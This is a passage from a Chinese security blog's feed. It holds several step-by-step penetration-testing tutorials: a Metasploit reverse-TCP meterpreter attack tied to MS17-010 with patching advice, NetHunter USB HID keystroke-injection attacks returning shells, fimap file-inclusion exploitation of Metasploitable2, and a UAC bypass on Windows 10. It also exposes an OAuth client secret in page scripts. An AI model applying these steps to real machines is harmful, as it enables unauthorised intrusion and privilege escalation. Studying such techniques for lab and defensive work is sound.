,因为是64位所以需要设置，如果是windows/meterpreter/reverse_tcp，会没有获取到会话<br><img src="http://ojg8j426f.bkt.clouddn.com/1494976290705.jpg" alt="enter description here"><br>&nbsp;</p><p><pre>set PAYLOAD windows/x64/meterpreter/reverse_tcp</pre><br><img src="http://ojg8j426f.bkt.clouddn.com/1494976235055.jpg" alt="enter description here"><br>&nbsp;<br>5.设置本机反向shell连接 如：</p><p><pre>set LHOST 192.168.1.104 <pre><br><img src="http://ojg8j426f.bkt.clouddn.com/1494976395829.jpg" alt="enter description here"><br>&nbsp;<br>6.exploit执行攻击载荷</pre></pre></p><p><pre>exploit</pre><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1494976471479.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1494976482764.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="安全建议："><a href="#安全建议：" class="headerlink" title="安全建议："></a>安全建议：</h2><p>由于之前爆发过多起利用445端口共享漏洞攻击案例，运营商对个人用户关闭了445端口。因校园网是独立的，故无此设置，加上不及时更新补丁，所以在本次事件中导致大量校园网用户中招。管家提供以下安全建议：</p><p>1、关闭445、139等端口，方法详见：<a href="http://mp.weixin.qq.com/s/7kArJcKJGIZtBH1tKjQ-uA" target="_blank" rel="external">http://mp.weixin.qq.com/s/7kArJcKJGIZtBH1tKjQ-uA</a></p><p>2、下载并更新补丁，及时修复漏洞（目前微软已经紧急发布XP、Win8、Windows server2003等系统补丁，已经支持所有主流系统，请立即更新）。</p><p>XP、Windows Server 2003、win8等系统访问：<a href="http://www.catalog.update.microsoft.com/Search.aspx?q=KB4012598" target="_blank" rel="external">http://www.catalog.update.microsoft.com/Search.aspx?q=KB4012598</a></p><p>Win7、win8.1、Windows Server 2008、Windows 10, Windows Server 2016等系统访问： <a href="https://technet.microsoft.com/zh-cn/library/security/ms17-010.aspx" target="_blank" rel="external">https://technet.microsoft.com/zh-cn/library/security/ms17-010.aspx</a></p><p>3、安装腾讯电脑管家，电脑管家会自动开启主动防御进行拦截查杀；</p><p>4、支付比特币并不能解密文件，不要支付比特币，保留被加密的文件，等待解密。</p><p><div id="container"></div></p><p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p><script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script><script>  var gitment = new Gitment({    owner: 'secistblog',    repo: 'secistblog.github.io',    oauth: {      client_id: '31ca58bed60fa9231b5f',      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',    },  })  gitment.render('container')</script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/20170515_065228_919.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Metasploit" scheme="http://yoursite.com/categories/Metasploit/"/>
    
    
      <category term="Metasploit" scheme="http://yoursite.com/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>黑手第三篇----DuckHunterHID for mac</title>
    <link href="http://yoursite.com/DuckHunterHID.html"/>
    <id>http://yoursite.com/DuckHunterHID.html</id>
    <published>2017-04-18T11:51:51.000Z</published>
    <updated>2017-09-11T16:40:39.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/maxresdefault.jpg" alt="enter description here"><br><a id="more"></a><br>  继上一篇nethunter 的HID键盘攻击之后，我打算在我的mac上进行HID攻击，（<a href="http://www.ggsec.cn/nethuner-HID.html" target="_blank" rel="external">http://www.ggsec.cn/nethuner-HID.html</a> ） 这次使用到的是USB-DuckHunter-HID，下面请看背景知识回顾—————–》<br>&nbsp;</p><p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=31209890&auto=0&height=66"></iframe><br>0x00</p><h2 id="HID-键盘攻击"><a href="#HID-键盘攻击" class="headerlink" title="HID 键盘攻击"></a>HID 键盘攻击</h2><p>在这个视频键盘HID攻击被证明。<br>它可以在几秒钟内通过USB将目标解锁机器。它通过模拟键盘和鼠标，盲目地键入受控命令，轻击鼠标指针并使鼠标点击武器。<br>这是什么？<br>几乎每台包括台式机，笔记本电脑，平板电脑和智能手机的电脑都通过键盘输入人类。这就是为什么有一个称为HID或人机接口设备的无处不在的USB标准的规范。简单地说，声称是Keyboard HID的任何USB设备将被大多数现代操作系统自动检测和接受。无论是Windows，Mac，Linux还是Android设备，键盘都是King。</p><p>通过利用这种固有的信任，脚本敲击的速度超过每分钟1000字，传统的对策可以被这个不知疲倦的骑兵绕过 - USB攻击。<br>&nbsp;<br>&nbsp;</p><h2 id="DuckHunter-HID"><a href="#DuckHunter-HID" class="headerlink" title="DuckHunter HID"></a>DuckHunter HID</h2><p>DuckHunter HID选项允许您快速方便地将USB Rubber Ducky脚本转换为NetHunter HID攻击格式。您可以从示例预设菜单中选择一个选项，或从Duck Toolkit站点中选择更多选择的预配置脚本。<br>进攻安全人员再次出现。受欢迎的Pentesting发行版Kali Linux的构建者为Android设备推出了一款名为Kali NetHunter的新工具。该工具是一种移动分销，旨在在Android手机上安装并运行时通过USB危及系统。</p><p>该工具可以通过HID风格的攻击伪装成键盘，发出命令以打开其他攻击中的管理外壳，包括BadUSB中间人风格的攻击。该工具的图片目前可用于Nexus设备，但其他Android设备的构建可能正在进行中。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1zdsvb8.jpg" alt="enter description here"></p><p>&nbsp;<br>&nbsp;</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>   <span style="color: #ff0000;"> 首先我们来看下，黑手（kali_nethunter）的duck_HID 给我们提供了哪些默认的脚本。</span></p><ol><li>首先呢 我们可以看到在nethunter客户端上可以看到有（DuckHunter HID ）字样，其实他就是模拟黄鸭，USB Rubber Ducky脚本转换为NetHunter HID攻击格式。<br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/3B83EDEB-6401-47BD-97AC-F67EBA4912F1.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>在默认的选项我们可以看到他给我们提供了默认的几个选项，其中有两个脚本呢 是针对Mac OSX 的HID攻击，攻击后呢<br>返回一个shell连接，这里其中有perl和Ruby两个脚本，我们就选择其中一个选择ruby。<br><img src="http://ojg8j426f.bkt.clouddn.com/9DA2E76E-459B-4295-902B-3EF8FF5F87B2.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2>选择ruby脚本。我们来简单的看下代码的意思<br><img src="http://ojg8j426f.bkt.clouddn.com/1CF817DC-6562-446F-9850-D88922A5E14E.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>0X03<br>1.COMMAND SPACE—–在mac的快捷键表示为搜索框搜索<br><img src="http://ojg8j426f.bkt.clouddn.com/6A323763-0ACE-4230-8638-42AE41A643C9.png" alt="enter description here"><br>&nbsp;<br>2.STRING terminal  ENTER——–输入字符串terminal 搜索终端，并按下回车<br><img src="http://ojg8j426f.bkt.clouddn.com/432C200A-9E1E-423E-A928-CC24DC452D75.png" alt="enter description here"><br>&nbsp;<br>3.Command+n就是新建的快捷键，功能是新建一个项目，在不同程序有不同的新建项目种类。<br><img src="http://ojg8j426f.bkt.clouddn.com/82B4B55D-25D0-4B43-91B9-3C587FF2B470.png" alt="enter description here"><br>&nbsp;<br>4.在终端下输入字符串使用ruby socket建立服务端<br><img src="http://ojg8j426f.bkt.clouddn.com/4F756B21-2BF7-4F64-929B-D1F2044789F8.png" alt="enter description here"><br>&nbsp;<br>5.当然了在这段代码也我们提示了 使用netcat（nc ）建立监听 并返回会话，他这里0.0.0.0提示我们更改我们黑手nethunter的ip地址。<br>如：<br>查看黑手使用的ip<br><img src="http://ojg8j426f.bkt.clouddn.com/FF774580-92C6-4BFE-A2C0-3AE59A011A21.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><strong><span style="color: #008000;">更改ip</span><br><img src="http://ojg8j426f.bkt.clouddn.com/1BB5C440-F798-4F15-B2F3-3830EFD44FA9.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><strong><span style="color: #008000;">保存脚本</span><br><img src="http://ojg8j426f.bkt.clouddn.com/3F33287D-827C-4CC0-BFEE-FFA398CE9FBE.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<h2 id="0X04"><a href="#0X04" class="headerlink" title="0X04"></a>0X04</h2>1.<strong><span style="color: #008000;">并且在终端中使用nc命令建立监听 </span>———nc -vv -l -p 1337<br><img src="http://ojg8j426f.bkt.clouddn.com/DD63EB85-CE67-447A-A17E-D7E16EF7BB22.png" alt="enter description here"></strong></strong></strong></li></ol><p>&nbsp;<br>&nbsp;<br>2 .点击三角按钮，<strong><span style="color: #008000;">执行攻击</span>。<br><img src="http://ojg8j426f.bkt.clouddn.com/1833878B-24B2-48BD-8438-0EDD524619D7.png" alt="enter description here"></strong></p><p>&nbsp;<br>&nbsp;<br>3.<strong><span style="color: #008000;">返回shell连接</span><br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/7DD01722-EC8C-43AD-94F9-3D7BF4A7398D.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><span style="color: #008000;">最终结果：</span><br><img src="http://ojg8j426f.bkt.clouddn.com/9E207E32-F824-4000-BC11-7207FDA27AC1.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>更多项目可在github–USBDucky 项目中寻找你需要的PAYLOAD。<br><a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads" target="_blank" rel="external">https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads</a><br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1492519263301.jpg" alt="enter description here"></strong></p><h2 id="视频演示"><a href="#视频演示" class="headerlink" title="视频演示"></a>视频演示</h2><p>可观看个人演示的视频</p><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/DuckHunterHID.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><p><img src="http://ojg8j426f.bkt.clouddn.com/625CE7389F506CD27830E0AC9450F043.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/926EC2F4CAA40850C68695B568ED7C5E.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/958E71B5A3E801BBD876231B610B9B67.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/0C3A8A27E4B981F504D4EA54E2BE8BFC.jpg" alt="enter description here"></p><p><div id="container"></div></p><p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p><script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script><script>  var gitment = new Gitment({    owner: 'secistblog',    repo: 'secistblog.github.io',    oauth: {      client_id: '31ca58bed60fa9231b5f',      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',    },  })  gitment.render('container')</script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/maxresdefault.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
    
    
      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>Fimap_Metasploitable2漏洞攻击</title>
    <link href="http://yoursite.com/fimap_metasploitable2%20.html"/>
    <id>http://yoursite.com/fimap_metasploitable2 .html</id>
    <published>2017-03-19T17:18:54.000Z</published>
    <updated>2017-09-11T16:41:57.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/hack-like-pro-linux-basics-for-aspiring-hacker-part-10-manipulating-text.1280x600.jpg" alt="enter description here"><br><a id="more"></a></p><p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=31090440&auto=0&height=66"></iframe></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Fimap是一款本地及远程的文件包含漏洞检测工具，并能对检测到的漏洞进行利用，带了一个google的语法搜索功能，这款工具只针对文件包含漏洞的检测及利用.<br>&nbsp;<br>&nbsp;<br>本次使用到的环境：docker_kali      攻击者<br>                                metasploitable2 靶机环境<br>&nbsp;</p><h2 id="kali中自带的工具-fimap"><a href="#kali中自带的工具-fimap" class="headerlink" title="kali中自带的工具:fimap"></a>kali中自带的工具:fimap</h2><pre><code>&lt;p&gt; -H，--harvest模式为新URL收集URL。 需要一个根网址（-u）开始在那里爬网。   还需要（-w）为质量模式编写URL列表&amp;nbsp;      -d，--depth = CRAWLDEPTH  您希望在收获模式（-H）下爬网目标网站的CRAWLDEPTH（递归级别）。默认值为1.   &amp;nbsp;  -x，--exploit  启动一个交互式会话，您可以在其中, 选择一个目标并执行某些操作  &amp;nbsp; -C，--enable-color    --force-run忽略实例检查，只要运行fimap。&lt;/p&gt;  &amp;nbsp;</code></pre><p>例子：</p><pre><code>1. 简单扫描    ./fimap.py -u &apos;http://localhost/test.php?file=bang&amp;id=23&apos;2. 使用列表进行扫描    ./fimap.py -m -l &apos;/tmp/urllist.txt&apos;3. 使用谷歌语法搜索    ./fimap.py -g -q &apos;inurl:include.php&apos;4. 收集递归等级为3和的网页的所有链接  将URL写入 /tmp/urllist    ./fimap.py -H -u &apos;http://localhost&apos; -d 3 -w /tmp/urllist    参考资料：http://tools.kali.org/web-applications/fimap</code></pre><h2 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/fimap_metasploitasble2.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><p>&nbsp;<br>&nbsp;<br>1.本次使用到的是metaspolitable2 靶机环境 ，我们打开浏览器输入该靶机的 ip<br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/88D2C627-A21A-4D32-BA8F-A99B10295CEA.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>2.使用fimap的例子4 进行尝试检测 ：</p><p><pre>fimap -H -u <a href="http://localhost" target="_blank" rel="external">http://localhost</a> -d 3 -w /tmp/urllist </pre><br>               <img src="http://ojg8j426f.bkt.clouddn.com/ED9EF7FC-9179-4DEC-8518-943F955A63E9.png" alt="enter description here"><br> &nbsp;<br> &nbsp;<br>  3.在上图中可以看到，对dvwa/dav/twiki/等进行扫描，图中对Mutillidae扫描的列表比较多。<br></p><p><pre>mutillidae是一个免费，开源的Web应用程序，提供专门被允许的安全测试和入侵的Web应用程序。它是由Adrian “Irongeek” Crenshaw和Jeremy “webpwnized” Druin.开发的一款自由和开放源码的Web应用程序。其中包含了丰富的渗透测试项目，如SQL注入、跨站脚本、clickjacking、本地文件包含、远程代码执行等.</pre><br><br>对检测到的漏洞进行攻击，并忽略实例检查：<br> <pre>fimap -x  –force-run</pre><br> <img src="http://ojg8j426f.bkt.clouddn.com/E8C58339-2B1A-4DBF-9838-1D184DA11C86.png" alt="enter description here"><br>  &nbsp;<br>  &nbsp;</p><p> 4.填写目标序列号1 。进入漏洞url列表，选择漏洞id 如选择1。<br><img src="http://ojg8j426f.bkt.clouddn.com/1A11FB48-777A-4832-83F5-F9030962F822.png" alt="enter description here"><br> &nbsp;<br> &nbsp;<br>5、执行攻击 选择攻击模式。如选择1<br><img src="http://ojg8j426f.bkt.clouddn.com/5EA09A65-D9CE-465E-9691-11EDBB932620.png" alt="enter description here"><br> &nbsp;<br> &nbsp;<br> 使用fimap 反弹shell 得到回话、<br> <img src="http://ojg8j426f.bkt.clouddn.com/B7414489-7646-473D-B6C8-FF55C9DBA1AE.png" alt="enter description here"><br> &nbsp;<br> &nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/49F45637-F5EF-45F6-A1D5-07A5F624F421.png" alt="enter description here"></p><p><div id="container"></div></p><p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p><script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script><script>  var gitment = new Gitment({    owner: 'secistblog',    repo: 'secistblog.github.io',    oauth: {      client_id: '31ca58bed60fa9231b5f',      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',    },  })  gitment.render('container')</script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/hack-like-pro-linux-basics-for-aspiring-hacker-part-10-manipulating-text.1280x600.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
    
    
      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>metaspolit_bypassuac_win10</title>
    <link href="http://yoursite.com/bypassuac-win10.html"/>
    <id>http://yoursite.com/bypassuac-win10.html</id>
    <published>2017-02-26T10:50:47.000Z</published>
    <updated>2017-09-11T16:41:38.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/slip-backdoor-into-php-websites-with-weevely.1280x600.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/win10_bypassUAC.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><p>&nbsp;<br>&nbsp;<br>当你得一个meterpreter会话，却提不了权怎么办？？<br>Demon：嘚吧嘚————<strong><span style="color: #ff0000;">此方法只能绕过本机防护机制，但是绕不过360等。以及此模块需更新最新版即可</span></strong><br>&nbsp;</p><h2 id="第一步：搜索-bypassuac"><a href="#第一步：搜索-bypassuac" class="headerlink" title="第一步：搜索 bypassuac"></a>第一步：搜索 bypassuac</h2><p>  <pre>msf exploit(web_delivery) &gt; search bypassuac</pre><br>   &nbsp;<br>  &nbsp;<br>  &nbsp;</p><h2 id="第二步-使用提权模块，进行对windows-uac绕过。"><a href="#第二步-使用提权模块，进行对windows-uac绕过。" class="headerlink" title="第二步: 使用提权模块，进行对windows uac绕过。"></a>第二步: 使用提权模块，进行对windows uac绕过。</h2><p>  <pre>msf  exploit(web_delivery) &gt; use    exploit/windows/local/bypassuac_eventvwr</pre><br>  &nbsp;<br>  &nbsp;<br>  &nbsp;<br>///  查看模块选项  <strong><span style="color: #ff0000;">msf exploit(bypassuac_eventvwr) &gt; </span></strong> options </p><p>Module options (exploit/windows/local/bypassuac_eventvwr):</p><p>   Name     Current Setting  Required  Description</p><hr><p>   SESSION                   yes       The session to run this module on.</p><p>Exploit target:</p><p>   Id  Name</p><hr><p>   0   Windows x86<br>/////////////<br>&nbsp;<br>&nbsp;<br>&nbsp;</p><h2 id="第三步：-设置回话-（比如说我这里的话说是1）那就设置1"><a href="#第三步：-设置回话-（比如说我这里的话说是1）那就设置1" class="headerlink" title="第三步： 设置回话 （比如说我这里的话说是1）那就设置1"></a>第三步： 设置回话 （比如说我这里的话说是1）那就设置1</h2><p>  <pre>msf exploit(bypassuac_eventvwr) &gt; set SESSION 1   SESSION =&gt; 1</pre><br>  &nbsp;<br>  &nbsp;<br>  &nbsp;<br>  第四步： 执行exploit，执行提权。<br>  <pre>msf exploit(bypassuac_eventvwr) &gt; exploit</pre><br>  <img src="http://ojg8j426f.bkt.clouddn.com/3347C261-C404-42C2-91DF-F0127E0EEBA2.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>&nbsp;</p><h2 id="第五步-：查看会话，在这里你可以发现有2个回话。"><a href="#第五步-：查看会话，在这里你可以发现有2个回话。" class="headerlink" title="第五步 ：查看会话，在这里你可以发现有2个回话。"></a>第五步 ：查看会话，在这里你可以发现有2个回话。</h2><p>  <pre> msf exploit(bypassuac_eventvwr) &gt; sessions</pre><br>  <img src="http://ojg8j426f.bkt.clouddn.com/3B5F2DCE-F5FC-4BC0-90C7-C45341264BA1.png" alt="enter description here"></p><p>&nbsp;<br>&nbsp;<br>&nbsp;</p><h2 id="第六步：进入会话2。"><a href="#第六步：进入会话2。" class="headerlink" title="第六步：进入会话2。"></a>第六步：进入会话2。</h2><p>进入meterpreter会话，进行进一步的提权操作.<br>以<strong><span style="color: #ff0000;">及下面是提权前普通用户和 提权后system 最高权限对比！</span></strong></p><p><img src="http://ojg8j426f.bkt.clouddn.com/26313E4C-3102-491D-9AE9-966F3AF09478.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/465A28FB-C0F5-4D1B-A3B4-CF307434D661.png" alt="enter description here"></p><p>  <div id="container"></div></p><p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p><script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script><script>  var gitment = new Gitment({    owner: 'secistblog',    repo: 'secistblog.github.io',    oauth: {      client_id: '31ca58bed60fa9231b5f',      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',    },  })  gitment.render('container')</script><h2 id="视频中相关代码可复制"><a href="#视频中相关代码可复制" class="headerlink" title="视频中相关代码可复制"></a>视频中相关代码可复制</h2><p><strong><span style="color: #ff0000;">代码可直接复制！！！</span></strong></p><p><strong><span style="color: #ff0000;">代码可直接复制！！！</span></strong></p><p><strong><span style="color: #ff0000;">代码可直接复制！！！</span></strong></p><p><strong><span style="color: #ff0000;">代码可直接复制！！！！</span></strong></p><p>&nbsp;</p><link rel="stylesheet" type="text/css" href="http://oc78wb8cz.bkt.clouddn.com/asciinema-player.css"><p>  <asciinema-player src="http://oc78wb8cz.bkt.clouddn.com/win10bypass_uac.json" cols="100" rows="30"></asciinema-player></p>  <script src="http://oc78wb8cz.bkt.clouddn.com/asciinema-player.js"></script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/slip-backdoor-into-php-websites-with-weevely.1280x600.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Metasploit" scheme="http://yoursite.com/categories/Metasploit/"/>
    
    
      <category term="Metasploit" scheme="http://yoursite.com/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>黑手之kali_Nethuner---HID攻击</title>
    <link href="http://yoursite.com/nethuner-HID.html"/>
    <id>http://yoursite.com/nethuner-HID.html</id>
    <published>2017-02-05T23:45:51.000Z</published>
    <updated>2017-09-12T13:58:29.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-接着走着黑手——kali-nethuner的坑"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-接着走着黑手——kali-nethuner的坑" class="headerlink" title="&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;接着走着黑手——kali_nethuner的坑"></a>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<span style="color: #ff0000;">接着走着黑手——kali_nethuner的坑</span></h2><p><img src="http://ojg8j426f.bkt.clouddn.com/u=2300716969,694719089&amp;fm=23&amp;gp=0.jpg" alt="enter description here"><br><a id="more"></a><br>继<a herf="http://www.ggsec.cn/2017/01/27/msf-web-delivery/">Metasploit后门免杀模块之绕过360</a>我想到了一个思路<br>在Nethuner上 可以执行HID 攻击。</p><p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=18155583&auto=0&height=66"></iframe>en</p><h2 id="HID攻击介绍"><a href="#HID攻击介绍" class="headerlink" title="HID攻击介绍"></a><span style="color: #ff0000;">HID攻击介绍</span></h2><p>HID是Human Interface Device的缩写，由其名称可以了解HID设备是直接与人交互的设备，例如键盘、鼠标与游戏杆等。不过HID设备并不一定要有人机接口，只要符合HID类别规范的设备都是HID设备。一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将含有攻击向量的鼠标或键盘，插入电脑时，恶意代码会被加载并执行。</p><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/HID_Attacks.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p><h2 id="HID-Attacks—–nethuner"><a href="#HID-Attacks—–nethuner" class="headerlink" title="HID Attacks—–nethuner"></a>HID Attacks—–nethuner</h2><p><span style="color: #ff0000;">nethuner 自带的一个HID 攻击 模拟键盘的功能，通过usb数据线插上pc端，即可绕过安全防护等。</span><br><img src="http://ojg8j426f.bkt.clouddn.com/9BC31A4F-47C1-46E7-9409-C0F2EE1704BE.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>将代码辅助到此处 执行cmd 命令，以及选择相应的绕过UAC的系统，可执行代码，反弹最终shell，得到meterpreter会话。<br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/ADD0806E-B337-4DC8-BE45-12E53F3EF77E.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/ED374E63-8387-4636-8F49-8158E778FC50.png" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/16A3D110-067F-40CF-9FDD-4B7DA652648E.png" alt="enter description here"><br>&nbsp;<br>&nbsp;</p><p>得到meterpreter会话。<br><img src="http://ojg8j426f.bkt.clouddn.com/63920EA7-0CA7-4D48-AD41-C0CDB053ACF7.png" alt="enter description here"><br>&nbsp;<br>&nbsp;</p><h2 id="结语：最好的结语是没有结语。截稿已经是凌晨44分了，太困了"><a href="#结语：最好的结语是没有结语。截稿已经是凌晨44分了，太困了" class="headerlink" title="结语：最好的结语是没有结语。截稿已经是凌晨44分了，太困了"></a>结语：最好的结语是没有结语。截稿已经是凌晨44分了，太困了</h2><p><div id="container"></div></p><p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p><script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script><script>  var gitment = new Gitment({    owner: 'secistblog',    repo: 'secistblog.github.io',    oauth: {      client_id: '31ca58bed60fa9231b5f',      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',    },  })  gitment.render('container')</script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-接着走着黑手——kali-nethuner的坑&quot;&gt;&lt;a href=&quot;#nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-接着走着黑手——kali-nethuner的坑&quot; class=&quot;headerlink&quot; title=&quot;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;接着走着黑手——kali_nethuner的坑&quot;&gt;&lt;/a&gt;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;span style=&quot;color: #ff0000;&quot;&gt;接着走着黑手——kali_nethuner的坑&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/u=2300716969,694719089&amp;amp;fm=23&amp;amp;gp=0.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
    
    
      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit后门免杀模块之绕过360</title>
    <link href="http://yoursite.com/msf-web-delivery.html"/>
    <id>http://yoursite.com/msf-web-delivery.html</id>
    <published>2017-01-27T19:18:18.000Z</published>
    <updated>2017-09-12T14:02:36.000Z</updated>
    
